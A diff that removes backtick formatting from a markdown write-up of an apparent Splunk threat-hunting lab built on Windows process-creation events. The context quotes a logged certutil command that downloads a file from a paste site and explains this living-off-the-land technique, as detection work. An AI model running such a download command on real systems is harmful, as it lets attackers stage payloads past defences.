@@ -15,7 +15,7 @@ The investigation surfaces three findings in one event stream: an **imposter use
 
 ## Tools Used
 
-- **Splunk** with SPL queries against the `win_eventlogs` index.
+- **Splunk** with SPL queries against the win_eventlogs index.
 - **Windows EventID 4688** (Audit Process Creation) as the sole data source.
 - **MITRE ATT&CK** for technique mapping.
 
@@ -61,7 +61,7 @@ A single event surfaces:
 certutil.exe -urlcache -f - https://controlc.com/<id> benign.exe
 ```
 
-**certutil.exe** is a legitimate Windows Certificate Services utility used for cert management. The `-urlcache -f` flags force it to fetch a remote URL and cache it locally, effectively turning it into a download tool. This is the textbook **LOLBin** (*living off the land binary*) abuse: a Microsoft-signed binary doing a generic download.
+**certutil.exe** is a legitimate Windows Certificate Services utility used for cert management. The -urlcache -f flags force it to fetch a remote URL and cache it locally, effectively turning it into a download tool. This is the textbook **LOLBin** (*living off the land binary*) abuse: a Microsoft-signed binary doing a generic download.
 
 Mapped to MITRE ATT&CK:
 
